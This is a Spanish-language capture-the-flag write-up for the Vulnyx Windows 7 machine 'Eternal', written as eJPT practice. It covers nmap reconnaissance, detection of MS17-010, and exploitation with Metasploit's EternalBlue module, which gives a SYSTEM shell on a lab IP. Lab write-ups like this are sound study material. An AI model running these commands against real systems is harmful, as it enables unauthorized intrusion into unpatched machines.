# Eternal

> 🧠 **Plataforma:** Vulnyx
>
> 💻 **Sistema operativo:** Windows
>
> 🎯 **Nivel:** Easy
>
> ✅ **Estado:** Done
>
> 📘 **Curso eJPT:** yes
>
> 🗓️ **Fecha de creación:** 15 de marzo de 2025 0:38
>
> 🌐 **IP:** `192.168.0.12`

---


## Recopilación de información

<aside>
💡 Reconocimiento general

</aside>

```bash
sudo arp-scan -I eth0 --localnet

192.168.0.12	08:00:27:7d:c6:d4	PCS Systemtechnik GmbH
```

### **Escaneo de puertos**

Comenzamos con un escaneo para identificar que puertos están abiertos.

---

```bash
sudo nmap -p- --open -T5 -sS --min-rate 5000 -n -Pn -vvv <IP> -oG allports
PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 128
139/tcp   open  netbios-ssn  syn-ack ttl 128
445/tcp   open  microsoft-ds syn-ack ttl 128
5357/tcp  open  wsdapi       syn-ack ttl 128
49152/tcp open  unknown      syn-ack ttl 128
49153/tcp open  unknown      syn-ack ttl 128
49154/tcp open  unknown      syn-ack ttl 128
49155/tcp open  unknown      syn-ack ttl 128
49156/tcp open  unknown      syn-ack ttl 128
49157/tcp open  unknown      syn-ack ttl 128
```

### **Enumeración de servicios**

Una vez listado los puertos accesibles, procederemos a realizar la enumeración de servicios para su posterior identificación de vulnerabilidades.

---

```bash
sudo nmap -p135,139,445,5357,49152,49153,49154,49155,49156,49157 -sCV 192.168.0.12 -oN targeted

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Enterprise 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
5357/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:7D:C6:D4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -19m59s, deviation: 34m38s, median: 0s
|_nbstat: NetBIOS name: MIKE-PC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:7d:c6:d4 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: MIKE-PC
|   NetBIOS computer name: MIKE-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-15T00:45:05+01:00
| smb2-time: 
|   date: 2025-03-14T23:45:05
|_  start_date: 2025-03-14T23:39:37
```

- **Identificación de vulnerabilidades**

```bash
nmap --script "safe or smb-enum-*" -p 445 192.168.0.12 -oX smb_enum.xml
PORT    STATE SERVICE
445/tcp open  microsoft-ds
smb-vuln-ms17-010: 
VULNERABLE:

smb-os-discovery: 
|   OS: Windows 7 Enterprise 7601 Service Pack 1 (Windows 7 Enterprise 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1
|   Computer name: MIKE-PC
|   NetBIOS computer name: MIKE-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-03-15T00:47:40+01:00
```

## Explotación

<aside>
💡 Probamos diferentes accesos

</aside>

### Explotación 1

Como vemos que es vulnerable a ms17-010

```bash
msf6 > search ms17-010
msf6 > exploit(windows/smb/ms17_010_eternalblue) 
msf6 > setg RHOSTS 192.168.0.12
msf6 > run
meterpreter> getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter> shell
C:\Users\MIKE>cd desktop
C:\Users\MIKE\Desktop>dir
dir
 El volumen de la unidad C no tiene etiqueta.
 El n�mero de serie del volumen es: 44FD-46F4

 Directorio de C:\Users\MIKE\Desktop

03/02/2024  12:50    <DIR>          .
03/02/2024  12:50    <DIR>          ..
03/02/2024  12:50                35 root.txt
03/02/2024  12:50                35 user.txt
               2 archivos             70 bytes
               2 dirs  24.078.188.544 bytes libres

C:\Users\MIKE\Desktop>
```

### Escalada de privilegios

Al acceder como NTAUHORITY\SYSTEM con metasploit , no hace falta elevar privilegios

## Conclusión

<aside>
💡 Maquina realizada para preparar la EJPT

</aside>